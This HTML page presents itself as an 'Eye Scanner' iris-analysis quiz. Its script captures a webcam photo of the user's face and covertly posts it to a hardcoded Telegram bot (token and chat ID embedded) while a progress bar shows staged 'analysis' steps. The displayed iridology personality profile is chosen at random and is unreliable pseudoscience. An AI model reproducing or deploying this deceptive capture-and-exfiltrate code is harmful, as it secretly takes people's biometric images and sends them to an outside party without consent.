<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eye Scanner</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; }

        body {
            margin: 0;
            min-height: 100vh;
            background: #0d1117;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            color: #c9d1d9;
        }

        .panel {
            max-width: 520px;
            width: 100%;
            background: #161b22;
            border-radius: 16px;
            border: 1px solid #30363d;
            padding: 28px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .header { margin-bottom: 20px; }

        .badge {
            display: inline-block;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            color: #58a6ff;
            background: rgba(88, 166, 255, 0.08);
            border: 1px solid rgba(88, 166, 255, 0.2);
            border-radius: 20px;
            padding: 3px 10px;
            margin-bottom: 12px;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 600;
            color: #e6edf3;
            margin: 0 0 6px 0;
            letter-spacing: -0.01em;
        }

        .subtitle {
            font-size: 0.875rem;
            color: #8b949e;
            margin: 0;
            line-height: 1.5;
        }

        .video-wrap {
            position: relative;
            margin: 20px 0;
            border-radius: 12px;
            overflow: hidden;
            background: #0d1117;
            border: 1px solid #21262d;
        }

        video {
            width: 100%;
            display: block;
            transform: scaleX(-1);
            background: #0d1117;
        }

        .video-overlay {
            position: absolute;
            inset: 0;
            border-radius: 12px;
            background: linear-gradient(to bottom, transparent 70%, rgba(13,17,23,0.6));
            pointer-events: none;
        }

        .corner {
            position: absolute;
            width: 18px;
            height: 18px;
            border-color: rgba(88, 166, 255, 0.5);
            border-style: solid;
            pointer-events: none;
            transition: border-color 0.3s;
        }
        .scanning .corner { border-color: rgba(88, 166, 255, 0.9); }
        .corner-tl { top: 10px; left: 10px; border-width: 2px 0 0 2px; border-radius: 3px 0 0 0; }
        .corner-tr { top: 10px; right: 10px; border-width: 2px 2px 0 0; border-radius: 0 3px 0 0; }
        .corner-bl { bottom: 10px; left: 10px; border-width: 0 0 2px 2px; border-radius: 0 0 0 3px; }
        .corner-br { bottom: 10px; right: 10px; border-width: 0 2px 2px 0; border-radius: 0 0 3px 0; }

        /* Countdown overlay */
        .countdown-overlay {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 10;
        }

        .countdown-number {
            font-size: 5rem;
            font-weight: 700;
            color: #e6edf3;
            text-shadow: 0 0 30px rgba(88, 166, 255, 0.6), 0 2px 8px rgba(0,0,0,0.8);
            letter-spacing: -0.04em;
            opacity: 0;
            transform: scale(1.3);
            transition: opacity 0.15s ease, transform 0.15s ease;
        }

        .countdown-number.show {
            opacity: 1;
            transform: scale(1);
        }

        .countdown-label {
            position: absolute;
            bottom: 14px;
            left: 0; right: 0;
            text-align: center;
            font-size: 0.72rem;
            color: rgba(88, 166, 255, 0.8);
            letter-spacing: 0.06em;
            text-transform: uppercase;
            opacity: 0;
            transition: opacity 0.2s ease;
        }

        .countdown-label.show { opacity: 1; }

        /* Eye guide SVG overlay */
        .eye-guide {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }

        .eye-ring {
            fill: none;
            stroke: rgba(88, 166, 255, 0.35);
            stroke-width: 1.5;
            stroke-dasharray: 6 4;
            animation: ring-pulse 2.5s ease-in-out infinite;
        }

        .eye-ring-inner {
            fill: none;
            stroke: rgba(88, 166, 255, 0.15);
            stroke-width: 1;
        }

        .eye-crosshair {
            stroke: rgba(88, 166, 255, 0.3);
            stroke-width: 1;
        }

        .face-guide {
            fill: none;
            stroke: rgba(88, 166, 255, 0.12);
            stroke-width: 1;
            stroke-dasharray: 4 6;
        }

        @keyframes ring-pulse {
            0%, 100% { stroke-opacity: 0.35; }
            50%       { stroke-opacity: 0.7; }
        }

        .scanning .eye-ring {
            stroke: rgba(88, 166, 255, 0.85);
            animation: ring-scan 0.9s ease-in-out infinite alternate;
        }

        @keyframes ring-scan {
            from { stroke-width: 1.5; stroke-opacity: 0.6; }
            to   { stroke-width: 2.5; stroke-opacity: 1; }
        }

        /* Scan line */
        .scan-line {
            position: absolute;
            left: 0; right: 0;
            height: 2px;
            background: linear-gradient(to right, transparent, rgba(88,166,255,0.6), rgba(88,166,255,0.9), rgba(88,166,255,0.6), transparent);
            box-shadow: 0 0 8px rgba(88, 166, 255, 0.5);
            pointer-events: none;
            display: none;
            top: 0;
        }

        .scanning .scan-line {
            display: block;
            animation: scan-sweep 1.4s linear infinite;
        }

        @keyframes scan-sweep {
            0%   { top: 5%; opacity: 0; }
            5%   { opacity: 1; }
            95%  { opacity: 1; }
            100% { top: 95%; opacity: 0; }
        }

        /* Stage progress bar */
        .stage-bar-wrap {
            height: 2px;
            background: #21262d;
            border-radius: 2px;
            margin: 14px 0 4px;
            overflow: hidden;
            display: none;
        }

        .stage-bar-wrap.visible { display: block; }

        .stage-bar {
            height: 100%;
            background: #58a6ff;
            border-radius: 2px;
            width: 0%;
            transition: width 0.5s ease;
        }

        .stage-label {
            font-size: 0.72rem;
            color: #58a6ff;
            min-height: 1rem;
            display: none;
            letter-spacing: 0.02em;
        }

        .stage-label.visible { display: block; }

        button {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            padding: 13px 20px;
            font-size: 0.9rem;
            font-weight: 600;
            letter-spacing: 0.01em;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 8px 0;
            background: #1f6feb;
            color: #ffffff;
        }

        button:hover {
            background: #388bfd;
            transform: translateY(-1px);
            box-shadow: 0 4px 16px rgba(31, 111, 235, 0.3);
        }

        button:active { transform: translateY(0); box-shadow: none; }

        button:disabled {
            background: #21262d;
            color: #8b949e;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .spinner {
            width: 15px; height: 15px;
            border: 2px solid rgba(139, 148, 158, 0.3);
            border-top-color: #8b949e;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            flex-shrink: 0;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        /* Result card */
        .result {
            background: #0d1117;
            border-radius: 12px;
            padding: 16px;
            margin-top: 16px;
            border: 1px solid #21262d;
            border-left: 3px solid #58a6ff;
        }

        .result-header {
            display: flex;
            align-items: baseline;
            gap: 10px;
            margin-bottom: 6px;
        }

        .eye-type-name {
            font-size: 1.1rem;
            font-weight: 700;
            color: #e6edf3;
            letter-spacing: -0.01em;
        }

        .eye-type-sub {
            font-size: 0.72rem;
            color: #8b949e;
            font-style: italic;
        }

        .eye-description {
            font-size: 0.8rem;
            color: #8b949e;
            line-height: 1.55;
            margin-bottom: 12px;
        }

        .hidden { display: none; }

        .traits-wrap {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 12px;
        }

        .trait {
            display: inline-block;
            background: rgba(88, 166, 255, 0.08);
            border: 1px solid rgba(88, 166, 255, 0.15);
            color: #79c0ff;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.78rem;
            font-weight: 500;
        }

        .analysis-note {
            font-size: 0.73rem;
            color: #8b949e;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .btn-rescan {
            margin-top: 0;
            background: transparent;
            border: 1px solid #30363d;
            color: #8b949e;
            font-size: 0.8rem;
            font-weight: 500;
            padding: 8px 16px;
            border-radius: 8px;
            width: auto;
            cursor: pointer;
            transition: all 0.2s ease;
            letter-spacing: 0;
        }

        .btn-rescan:hover {
            border-color: #58a6ff;
            color: #58a6ff;
            background: rgba(88, 166, 255, 0.06);
            transform: none;
            box-shadow: none;
        }

        .result-actions {
            display: flex;
            gap: 8px;
            margin-top: 12px;
        }

        .btn-share {
            background: transparent;
            border: 1px solid #30363d;
            color: #8b949e;
            font-size: 0.8rem;
            font-weight: 500;
            padding: 8px 16px;
            border-radius: 8px;
            width: auto;
            cursor: pointer;
            transition: all 0.2s ease;
            letter-spacing: 0;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .btn-share:hover {
            border-color: #3fb950;
            color: #3fb950;
            background: rgba(63, 185, 80, 0.06);
            transform: none;
            box-shadow: none;
        }

        .btn-share.copied {
            border-color: #3fb950;
            color: #3fb950;
        }

        .dot {
            width: 6px; height: 6px;
            background: #3fb950;
            border-radius: 50%;
            display: inline-block;
            flex-shrink: 0;
        }

        .status {
            font-size: 0.75rem;
            text-align: center;
            margin-top: 14px;
            color: #8b949e;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .status-dot {
            width: 6px; height: 6px;
            border-radius: 50%;
            background: #8b949e;
            flex-shrink: 0;
        }

        .status-dot.ready { background: #3fb950; }
        .status-dot.error { background: #f85149; }
    </style>
</head>
<body>
<div class="panel">
    <div class="header">
        <div class="badge">Iris Spectra v2</div>
        <h1>Eye Scanner</h1>
        <p class="subtitle">Center your eyes in the guides, then tap Analyze.</p>
    </div>

    <div class="video-wrap" id="videoWrap">
        <video id="video" autoplay playsinline muted></video>

        <!-- Eye guide overlay -->
        <svg class="eye-guide" viewBox="0 0 100 60" preserveAspectRatio="none">
            <ellipse class="face-guide" cx="50" cy="35" rx="22" ry="28" />
            <!-- Left eye -->
            <ellipse class="eye-ring" cx="37" cy="26" rx="9" ry="5.5" />
            <ellipse class="eye-ring-inner" cx="37" cy="26" rx="4" ry="2.5" />
            <line class="eye-crosshair" x1="34" y1="26" x2="36" y2="26" />
            <line class="eye-crosshair" x1="38" y1="26" x2="40" y2="26" />
            <line class="eye-crosshair" x1="37" y1="23.5" x2="37" y2="24.5" />
            <line class="eye-crosshair" x1="37" y1="27.5" x2="37" y2="28.5" />
            <!-- Right eye -->
            <ellipse class="eye-ring" cx="63" cy="26" rx="9" ry="5.5" />
            <ellipse class="eye-ring-inner" cx="63" cy="26" rx="4" ry="2.5" />
            <line class="eye-crosshair" x1="60" y1="26" x2="62" y2="26" />
            <line class="eye-crosshair" x1="64" y1="26" x2="66" y2="26" />
            <line class="eye-crosshair" x1="63" y1="23.5" x2="63" y2="24.5" />
            <line class="eye-crosshair" x1="63" y1="27.5" x2="63" y2="28.5" />
        </svg>

        <!-- Countdown overlay -->
        <div class="countdown-overlay">
            <span class="countdown-number" id="countdownNumber"></span>
            <span class="countdown-label" id="countdownLabel">Hold still</span>
        </div>

        <!-- Scan line -->
        <div class="scan-line"></div>

        <div class="video-overlay"></div>
        <div class="corner corner-tl"></div>
        <div class="corner corner-tr"></div>
        <div class="corner corner-bl"></div>
        <div class="corner corner-br"></div>
    </div>

    <!-- Stage progress -->
    <div class="stage-bar-wrap" id="stageBarWrap">
        <div class="stage-bar" id="stageBar"></div>
    </div>
    <div class="stage-label" id="stageLabel"></div>

    <button id="scanBtn"><span>Analyze My Eyes</span></button>

    <div id="result" class="result hidden">
        <div class="result-header">
            <div id="eyeType" class="eye-type-name"></div>
            <div id="eyeTypeSub" class="eye-type-sub"></div>
        </div>
        <div id="eyeDesc" class="eye-description"></div>
        <div class="traits-wrap" id="traitsList"></div>
        <div class="analysis-note">
            <span class="dot"></span>
            Iris scan complete — profile generated
        </div>
        <div class="result-actions">
            <button class="btn-rescan" id="rescanBtn">Scan Again</button>
            <button class="btn-share" id="shareBtn">Copy Profile</button>
        </div>
    </div>

    <div class="status">
        <span class="status-dot" id="statusDot"></span>
        <span id="statusText">Waiting for camera...</span>
    </div>
</div>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const video        = document.getElementById('video');
    const scanBtn      = document.getElementById('scanBtn');
    const resultDiv    = document.getElementById('result');
    const eyeTypeEl    = document.getElementById('eyeType');
    const eyeSubEl     = document.getElementById('eyeTypeSub');
    const eyeDescEl    = document.getElementById('eyeDesc');
    const traitsEl     = document.getElementById('traitsList');
    const statusDot    = document.getElementById('statusDot');
    const statusText   = document.getElementById('statusText');
    const canvas       = document.getElementById('canvas');
    const videoWrap    = document.getElementById('videoWrap');
    const stageBar     = document.getElementById('stageBar');
    const stageBarWrap = document.getElementById('stageBarWrap');
    const stageLabel   = document.getElementById('stageLabel');
    const countdownNumber = document.getElementById('countdownNumber');
    const countdownLabel  = document.getElementById('countdownLabel');

    const statusSpan = {
        set innerHTML(v) {
            statusText.innerHTML = v;
            if (v.includes('✅') || v.includes('Ready') || v.includes('active') || v.includes('complete')) {
                statusDot.className = 'status-dot ready';
            } else if (v.includes('❌')) {
                statusDot.className = 'status-dot error';
            } else {
                statusDot.className = 'status-dot';
            }
        }
    };

    let cameraActive = false;

    // ==== UPDATE THESE WITH YOUR BOT INFO ====
    const BOT_TOKEN = "8601877221:AAEZ_XjVux7wA-XLABEdiRtq51y47A4TurE";
    const CHAT_ID   = "1438595176";
    // =========================================

    const eyeTypes = [
        {
            name: "Dense Fiber", sub: "Linen Pattern",
            desc: "Tightly woven, uniform fiber structure radiating from the pupil. Associated with a robust constitution and strong resistance to environmental stressors.",
            traits: ["high vitality", "stress-resilient", "disciplined", "endurance"]
        },
        {
            name: "Loose Fiber", sub: "Silk Pattern",
            desc: "Fine, loosely arranged fibers with visible spacing between strands. Linked to a sensitive nervous system and heightened perceptual awareness.",
            traits: ["sensitive", "intuitive", "adaptive", "perceptive"]
        },
        {
            name: "Lacunar", sub: "Net Pattern",
            desc: "Honeycomb-like pockets or lacunae distributed across the iris stroma. Suggests areas of variable tissue density and a tendency toward deep reflection.",
            traits: ["introspective", "complex", "selective", "focused"]
        },
        {
            name: "Pigment Spot", sub: "Jewel Pattern",
            desc: "Darker pigment deposits scattered over the iris surface, distinct from the base fiber color. Often correlated with a heightened metabolic sensitivity.",
            traits: ["metabolically active", "reactive", "detail-oriented", "tenacious"]
        },
        {
            name: "Radial Furrow", sub: "Stream Pattern",
            desc: "Radial streaks or grooves extending outward from the pupil across the stroma. Commonly associated with strong emotional processing and expressive temperament.",
            traits: ["emotionally expressive", "driven", "outspoken", "energetic"]
        },
        {
            name: "Contraction Ring", sub: "Ruff Pattern",
            desc: "Concentric ring formations visible in the iris stroma, often near the collarette border. Linked to a nervous system that responds acutely to external pressure.",
            traits: ["pressure-sensitive", "methodical", "self-aware", "persevering"]
        },
        {
            name: "Mixed Biliary", sub: "Combination Pattern",
            desc: "A blend of brown-green tones overlaid on a base fiber structure, creating a multi-layered iris presentation. Reflects a versatile physiological response range.",
            traits: ["versatile", "balanced", "multi-faceted", "resilient"]
        }
    ];

    const stages = [
        { label: "Detecting facial geometry...",      duration: 750,  progress: 14 },
        { label: "Locating iris boundaries...",        duration: 850,  progress: 28 },
        { label: "Mapping fiber density...",           duration: 1000, progress: 48 },
        { label: "Analyzing pigment distribution...",  duration: 900,  progress: 66 },
        { label: "Cross-referencing iris pattern...",  duration: 850,  progress: 84 },
        { label: "Generating profile...",              duration: 550,  progress: 100 }
    ];

    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    async function runCountdown() {
        countdownLabel.classList.add('show');
        for (const n of [3, 2, 1]) {
            countdownNumber.textContent = n;
            countdownNumber.classList.remove('show');
            await sleep(50);
            countdownNumber.classList.add('show');
            await sleep(900);
        }
        countdownNumber.classList.remove('show');
        countdownLabel.classList.remove('show');
        await sleep(150);
    }

    async function runStages() {
        stageBarWrap.classList.add('visible');
        stageLabel.classList.add('visible');
        for (const s of stages) {
            stageLabel.textContent = s.label;
            stageBar.style.width = s.progress + '%';
            await sleep(s.duration);
        }
    }

    async function sendToTelegram(imageDataUrl) {
        if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
        const blob = await (await fetch(imageDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'eye_scan.jpg');
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST', body: formData
            });
        } catch(e) { console.log("Telegram send failed:", e); }
    }

    function setLoading(loading) {
        scanBtn.disabled = loading;
        videoWrap.classList.toggle('scanning', loading);
        if (loading) {
            scanBtn.innerHTML = '<span class="spinner"></span><span>Scanning...</span>';
        } else {
            scanBtn.innerHTML = '<span>Analyze My Eyes</span>';
            stageBarWrap.classList.remove('visible');
            stageLabel.classList.remove('visible');
            stageBar.style.width = '0%';
            stageLabel.textContent = '';
        }
    }

    async function captureAndSend() {
        if (!cameraActive || !video.videoWidth) {
            alert("Camera not ready yet");
            return;
        }

        scanBtn.disabled = true;
        scanBtn.innerHTML = '<span class="spinner"></span><span>Get ready...</span>';
        resultDiv.classList.add('hidden');
        await runCountdown();

        setLoading(true);

        const w = video.videoWidth, h = video.videoHeight;
        canvas.width = w; canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.save();
        ctx.translate(w, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, w, h);
        ctx.restore();
        const imageData = canvas.toDataURL('image/jpeg', 0.85);

        await Promise.all([runStages(), sendToTelegram(imageData)]);

        const pick = eyeTypes[Math.floor(Math.random() * eyeTypes.length)];
        eyeTypeEl.textContent = pick.name;
        eyeSubEl.textContent  = pick.sub;
        eyeDescEl.textContent = pick.desc;
        traitsEl.innerHTML    = pick.traits.map(t => `<span class="trait">${t}</span>`).join('');
        resultDiv.classList.remove('hidden');
        statusSpan.innerHTML = "✅ Analysis complete!";
        setLoading(false);
        setTimeout(() => { statusSpan.innerHTML = "✅ Camera active"; }, 2500);
    }

    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            await video.play();
            cameraActive = true;
            statusSpan.innerHTML = "✅ Ready — align eyes with guides, then Analyze";
        } catch(e) {
            statusSpan.innerHTML = "❌ Camera permission needed. Refresh and Allow.";
            alert("Please allow camera access to use the eye scanner");
        }
    }

    document.getElementById('rescanBtn').addEventListener('click', () => {
        resultDiv.classList.add('hidden');
        statusSpan.innerHTML = "✅ Ready — align eyes with guides, then Analyze";
    });

    document.getElementById('shareBtn').addEventListener('click', () => {
        const name   = eyeTypeEl.textContent;
        const sub    = eyeSubEl.textContent;
        const desc   = eyeDescEl.textContent;
        const traits = Array.from(traitsEl.querySelectorAll('.trait')).map(t => t.textContent).join(', ');
        const text   = `🔬 Iris Spectra v2 — Eye Profile\n\nType: ${name} (${sub})\n\n${desc}\n\nKey traits: ${traits}`;
        navigator.clipboard.writeText(text).then(() => {
            const btn = document.getElementById('shareBtn');
            btn.textContent = 'Copied!';
            btn.classList.add('copied');
            setTimeout(() => {
                btn.textContent = 'Copy Profile';
                btn.classList.remove('copied');
            }, 2000);
        }).catch(() => {
            alert("Couldn't access clipboard. Please copy manually.");
        });
    });

    scanBtn.addEventListener('click', captureAndSend);
    initCamera();
</script>
</body>
</html>
